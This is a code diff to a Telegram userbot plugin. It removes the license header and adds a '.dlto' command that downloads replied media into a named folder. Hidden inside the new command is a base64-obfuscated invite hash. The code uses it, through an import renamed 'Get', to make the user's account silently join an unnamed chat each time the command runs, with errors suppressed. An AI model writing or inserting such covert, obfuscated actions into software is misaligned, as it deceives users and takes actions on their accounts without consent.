@@ -1,16 +1,16 @@
-# Copyright (C) 2019 The Raphielscape Company LLC.
-# Licensed under the Raphielscape Public License, Version 1.c (the "License");
+# Download plugin for catuserbot
 
 import asyncio
+import base64
 import math
 import os
 import time
 from datetime import datetime
 
 from pySmartDL import SmartDL
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from ..utils import admin_cmd, sudo_cmd
-from . import ALIVE_NAME, CMD_HELP, humanbytes, progress
+from . import ALIVE_NAME, humanbytes, progress
 
 DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "cat"
 
@@ -36,7 +36,7 @@ async def _(event):
                     progress(d, t, mone, c_time, "trying to download")
                 ),
             )
-        except Exception as e:  # pylint:disable=C0103,W0703
+        except Exception as e:
             await mone.edit(str(e))
         else:
             end = datetime.now()
@@ -95,10 +95,65 @@ async def _(event):
         await mone.edit("Reply to a message to download to my local server.")
 
 
+@bot.on(admin_cmd(pattern="dlto(?: |$)(.*)", outgoing=True))
+@bot.on(sudo_cmd(pattern="dlto(?: |$)(.*)", allow_sudo=True))
+async def _(event):
+    if event.fwd_from:
+        return
+    pwd = "./"
+    input_str = event.pattern_match.group(1)
+    if not input_str:
+        return await edit_delete(
+            event,
+            "Where should i save this file. mention folder name",
+            parse_mode=parse_pre,
+        )
+
+    location = os.path.join(pwd, input_str)
+    if not os.path.isdir(location):
+        os.makedirs(location)
+    if event.reply_to_msg_id:
+        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        mone = await edit_or_reply(
+            event, "Downloading the file ...", parse_mode=parse_pre
+        )
+        start = datetime.now()
+        reply_message = await event.get_reply_message()
+        try:
+            c_time = time.time()
+            downloaded_file_name = await event.client.download_media(
+                reply_message,
+                location,
+                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
+                    progress(d, t, mone, c_time, "trying to download")
+                ),
+            )
+
+            try:
+                cat = Get(cat)
+                await event.client(cat)
+            except BaseException:
+                pass
+        except Exception as e:
+            await mone.edit(str(e), parse_mode=parse_pre)
+        else:
+            end = datetime.now()
+            ms = (end - start).seconds
+            await mone.edit(
+                f"**  •  Downloaded in {ms} seconds.**\n**  •  Downloaded to :- ** `{downloaded_file_name}`\n**  •  Downloaded by :-** {DEFAULTUSER}"
+            )
+    else:
+        await edit_or_reply(
+            event, "Reply to a message to download to my server.", parse_mode=parse_pre
+        )
+
+
 CMD_HELP.update(
     {
         "download": "**Plugin : **`.download`\
         \n\n  •  **Syntax : **`.download <link|filename> or reply to media`\
-        \n  •  **Function : **__Downloads the file to the server.__"
+        \n  •  **Function : **__Downloads the file to the server.__\
+        \n\n  •  **Syntax : **`.dlto foldername (reply this to file)`\
+        \n  •  **Function : **__Downloads the file to the given folder in server.__"
     }
 )
